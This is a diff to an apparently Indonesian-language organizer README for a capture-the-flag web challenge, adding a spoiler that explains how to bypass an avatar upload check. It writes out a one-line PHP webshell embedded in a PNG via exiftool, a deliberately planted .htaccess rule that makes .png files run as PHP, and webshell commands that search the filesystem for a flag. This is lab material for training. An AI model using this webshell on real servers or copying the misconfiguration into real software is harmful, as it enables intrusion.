@@ -53,7 +53,35 @@ Link admin sengaja tidak ada di halaman manapun — peserta harus menemukannya d
 |---|---|---|---|
 | 1 | `FLAG_SQLI` | `lain.secrets` bucket `flag_sqli` | Error-based/UNION SQLi dump via sqlmap (tanpa tamper) |
 | 2 | `FLAG_ADMIN` | **TIDAK di database** — hanya muncul di dashboard `/administrator/dashboard.php` setelah login | Dump `lain.admin_users` → dapat `username:password` → login → flag ditampilkan dari env |
+| 3 | `FLAG_UPLOAD` | **File `flag.txt` di filesystem container** — dikubur di `/srv/.config/tachibana/.internal/navi/lain/.wired/flag.txt` (folder berlapis-lapis, di luar docroot) | Upload avatar di `/administrator/upload.php` hanya menerima gambar (ekstensi + `getimagesize()`). Bypass: polyglot PNG + payload PHP (mis. via exiftool/append setelah IEND) → dieksekusi karena `.htaccess` `AddType application/x-httpd-php .png` di folder upload → webshell → cari & baca `flag.txt` |
 | - | `FLAG_DECOY` | `lain.secrets` bucket `decoy` | Jebakan — bukan flag yang benar untuk submit |
+
+### Detail challenge upload (spoiler organizer)
+
+- Folder upload **dikubur dalam sarang folder berlapis** di bawah `images/`:
+  `/images/.cache/assets/gen/thumbs/.store/lain/avatar/` — menyamar sebagai
+  struktur cache/asset internal dengan beberapa folder diawali titik.
+  Dirsearch tidak akan menebak path sedalam ini; peserta menemukannya dari
+  URL preview di response upload.
+- Validasi: whitelist ekstensi (`jpg/jpeg/png/gif/webp`) + `getimagesize()`
+  (magic bytes) — polyglot image lolos keduanya.
+- `.htaccess` di folder terakhir berisi `AddType application/x-httpd-php .png ...`
+  (developer-style salah konfigurasi), jadi file `.png` berisi PHP dieksekusi.
+
+```bash
+# 1. Buat polyglot PNG + payload PHP
+exiftool -Comment='<?php system($_GET["c"]); ?>' lain.png -o avatar.png
+#    atau: cat lain.png >> payload.png (append setelah IEND)
+
+# 2. Login admin -> /administrator/upload.php -> upload avatar.png (lolos validasi)
+# 3. Buka URL dari response:
+#    /images/.cache/assets/gen/thumbs/.store/lain/avatar/avatar.png?c=env
+#    -> webshell jalan. Flag BUKAN di env: flag.txt dikubur di
+#    /srv/.config/tachibana/.internal/navi/lain/.wired/flag.txt
+#    Contoh pencarian: ?c=find / -name flag.txt 2>/dev/null
+#    lalu: ?c=cat /srv/.config/tachibana/.internal/navi/lain/.wired/flag.txt
+#    -> FLAG_UPLOAD muncul
+```
 
 ## Walkthrough (ORGANIZER ONLY — spoiler)
 
